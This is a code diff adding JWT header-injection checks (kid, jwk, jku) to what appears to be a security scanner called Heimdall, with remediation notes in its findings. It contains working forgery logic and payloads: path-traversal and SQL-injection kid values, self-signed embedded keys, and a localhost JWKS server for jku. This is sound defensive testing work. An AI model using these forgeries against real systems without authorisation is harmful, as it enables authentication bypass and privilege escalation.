@@ -121,6 +121,9 @@ def run(ctx: Context) -> None:
     _weak_secret(ctx, header, claims, token)
     _alg_confusion(ctx, header, claims, token)
     _leaked_private_key(ctx, header, claims, token)
+    _kid_injection(ctx, header, claims, token)
+    _jwk_injection(ctx, header, claims, token)
+    _jku_injection(ctx, header, claims, token)
     _token_in_query(ctx)
 
 
@@ -328,6 +331,205 @@ def _leaked_private_key(ctx: Context, header: dict, claims: dict, token: str) ->
             evidence=f"private key material found at: {srcs}",
             references=[REFS["A02"]],
             tools=["gitleaks", "trufflehog", "git filter-repo"],
+        )
+
+
+def _encode_signed(header: dict, claims: dict, key, alg: str) -> str | None:
+    """Sign with an arbitrary alg via PyJWT (for RS/ES header-injection forgeries)."""
+    try:
+        import jwt as pyjwt
+        extra = {k: v for k, v in header.items() if k != "alg"}
+        return pyjwt.encode(claims, key, algorithm=alg, headers=extra)
+    except Exception:  # noqa: BLE001
+        return None
+
+
+# ── kid header injection ──────────────────────────────────────────────────────
+
+def _kid_injection(ctx: Context, header: dict, claims: dict, token: str) -> None:
+    """The `kid` header selects the verification key. If it feeds a filesystem
+    path or a SQL query, an attacker can point it at predictable/empty content
+    (…/dev/null → empty HMAC key) or inject SQL to return a chosen key, then sign
+    the token themselves.
+    """
+    if not str(header.get("alg", "")).upper().startswith("HS"):
+        # kid tricks that coerce an HMAC key only help when HS* is accepted; the
+        # server may still accept HS even if it issued RS — worth trying anyway.
+        pass
+    trials = [
+        # (label, kid, hmac_key) — file paths that resolve to empty content.
+        ("path-traversal → /dev/null (empty key)",
+         "../../../../../../../../../../dev/null", ""),
+        ("absolute /dev/null (empty key)", "/dev/null", ""),
+        ("empty kid (empty key)", "", ""),
+        # SQL injection returning a constant we then sign with.
+        ("SQLi UNION-selected key",
+         "no-such-kid' UNION SELECT 'heimdallkid'-- -", "heimdallkid"),
+    ]
+    for label, kid, key in trials:
+        forged = _encode({**header, "alg": "HS256", "kid": kid}, _escalate(claims), key)
+        ok, code = _accepts(ctx, forged, token)
+        if ok:
+            ctx.finding(
+                id="a02-kid-injection", owasp="A02", severity="CRITICAL",
+                title="JWT 'kid' header injection — attacker controls the signing key",
+                summary=(
+                    "By setting the token's `kid` header, Heimdall made the server verify "
+                    f"against an attacker-known key ({label}), then signed a forged, escalated "
+                    "token with it and was accepted. `kid` must be treated as untrusted input "
+                    "and looked up safely (no filesystem/SQL interpolation)."
+                ),
+                evidence=f"kid={kid!r}, hmac key={key!r} → forged token accepted (HTTP {code})",
+                reproduction=f"jwt_tool <token> -I -hc kid -hv {kid!r} -S hs256 -p {key!r}",
+                references=[REFS["ps-jwt"], REFS["A02"]],
+                tools=["jwt_tool -I", "Burp (JWT Editor)"],
+            )
+            return
+    ctx.finding(
+        id="a02-kid-injection", owasp="A02", severity="SAFE",
+        title="JWT 'kid' header injection rejected",
+        summary="Path-traversal / empty-key / SQLi `kid` values did not yield an accepted "
+                "forged token.",
+    )
+
+
+# ── jwk (embedded key) and jku (remote JWKS) header injection ─────────────────
+
+def _rsa_material():
+    """Return (private_pem, jwk_dict) for a fresh RSA key Heimdall controls."""
+    from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    priv = key.private_bytes(serialization.Encoding.PEM,
+                             serialization.PrivateFormat.PKCS8,
+                             serialization.NoEncryption()).decode()
+    nums = key.public_key().public_numbers()
+
+    def b64(n: int) -> str:
+        return _b64(n.to_bytes((n.bit_length() + 7) // 8, "big"))
+    jwk = {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "heimdall",
+           "n": b64(nums.n), "e": b64(nums.e)}
+    return priv, jwk
+
+
+class _JwksServer:
+    """Ephemeral localhost JWKS server; records whether the target fetched it."""
+
+    def __init__(self, jwks: dict):
+        self._jwks = json.dumps(jwks).encode()
+        self.hits: list[str] = []
+        self._httpd = None
+        self.port = None
+
+    def __enter__(self):
+        import http.server
+        import threading
+        body, hits = self._jwks, self.hits
+
+        class H(http.server.BaseHTTPRequestHandler):
+            def do_GET(self):  # noqa: N802
+                hits.append(self.path)
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(body)
+
+            def log_message(self, *a):  # silence
+                return
+
+        self._httpd = http.server.HTTPServer(("127.0.0.1", 0), H)
+        self.port = self._httpd.server_address[1]
+        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()
+        return self
+
+    def __exit__(self, *a):
+        if self._httpd:
+            self._httpd.shutdown()
+
+
+def _jwk_injection(ctx: Context, header: dict, claims: dict, token: str) -> None:
+    """Embed our own public key in the `jwk` header and sign with the matching
+    private key; a verifier that trusts header-provided keys accepts it."""
+    priv, jwk = _rsa_material()
+    forged = _encode_signed({**header, "alg": "RS256", "jwk": jwk, "kid": "heimdall"},
+                            _escalate(claims), priv, "RS256")
+    ok, code = _accepts(ctx, forged, token) if forged else (False, 0)
+    if ok:
+        ctx.finding(
+            id="a02-jwk-header", owasp="A02", severity="CRITICAL",
+            title="JWT 'jwk' header trusted — self-signed key accepted",
+            summary=(
+                "The verifier trusted a public key EMBEDDED in the token header (`jwk`) and "
+                "validated a token Heimdall signed with the matching private key. Any attacker "
+                "can embed their own key and forge arbitrary tokens."
+            ),
+            evidence=f"header jwk (attacker key) accepted (HTTP {code})",
+            reproduction="jwt_tool <token> -X i   # inject self-signed jwk",
+            references=[REFS["ps-jwt"], REFS["A02"]],
+            tools=["jwt_tool -X i", "Burp (JWT Editor)"],
+        )
+    else:
+        ctx.finding(
+            id="a02-jwk-header", owasp="A02", severity="SAFE",
+            title="JWT 'jwk' header key is not trusted",
+            summary="A self-signed token carrying its verification key in the `jwk` header "
+                    "was rejected.",
+        )
+
+
+def _jku_injection(ctx: Context, header: dict, claims: dict, token: str) -> None:
+    """Host our JWKS on an ephemeral localhost server and point the token's `jku`
+    header at it. A hit on our server proves the verifier fetches an unvalidated
+    URL (SSRF); acceptance of the forged token proves full bypass."""
+    priv, jwk = _rsa_material()
+    host = "127.0.0.1"
+    with _JwksServer({"keys": [jwk]}) as srv:
+        url = f"http://{host}:{srv.port}/jwks.json"
+        forged = _encode_signed({**header, "alg": "RS256", "jku": url, "kid": "heimdall"},
+                                _escalate(claims), priv, "RS256")
+        ok, code = (False, 0)
+        if forged:
+            ok, code = _accepts(ctx, forged, token)
+        fetched = bool(srv.hits)
+
+    if ok:
+        ctx.finding(
+            id="a02-jku-header", owasp="A02", severity="CRITICAL",
+            title="JWT 'jku' header injection — verifier fetches attacker JWKS",
+            summary=(
+                "The verifier fetched a JWK Set from the attacker-controlled URL in the "
+                "token's `jku` header and used it to validate a token Heimdall signed. The "
+                "`jku` host is not allow-listed — full authentication bypass (and SSRF). Pin "
+                "`jku` to a trusted origin or drop header-provided keys entirely."
+            ),
+            evidence=f"jku={url} fetched by target ({len(srv.hits)} hit) and forged token "
+                     f"accepted (HTTP {code})",
+            reproduction="Host a JWKS with your key, set the `jku` header to it, sign with "
+                         "your private key.",
+            references=[REFS["ps-jwt"], REFS["A02"], REFS["A10"]],
+            tools=["jwt_tool -X s", "Burp Collaborator"],
+        )
+    elif fetched:
+        ctx.finding(
+            id="a02-jku-header", owasp="A02", severity="HIGH",
+            title="JWT 'jku' header is fetched from an unvalidated URL (SSRF)",
+            summary=(
+                "The verifier made an outbound request to the attacker-controlled `jku` URL "
+                "in the token header (Heimdall's ephemeral server received the hit) but did "
+                "not ultimately accept the forged token. The unvalidated fetch is itself an "
+                "SSRF and a strong sign `jku` is not allow-listed — verify signing acceptance "
+                "with a matching kid."
+            ),
+            evidence=f"target fetched {url} ({len(srv.hits)} request) — jku not allow-listed",
+            references=[REFS["ps-jwt"], REFS["A10"], REFS["A02"]],
+            tools=["jwt_tool -X s", "Burp Collaborator"],
+        )
+    else:
+        ctx.finding(
+            id="a02-jku-header", owasp="A02", severity="SAFE",
+            title="JWT 'jku' header is not fetched or trusted",
+            summary="An attacker-hosted `jku` URL was neither fetched nor accepted; the "
+                    "verifier ignores the `jku` header.",
         )
 
 
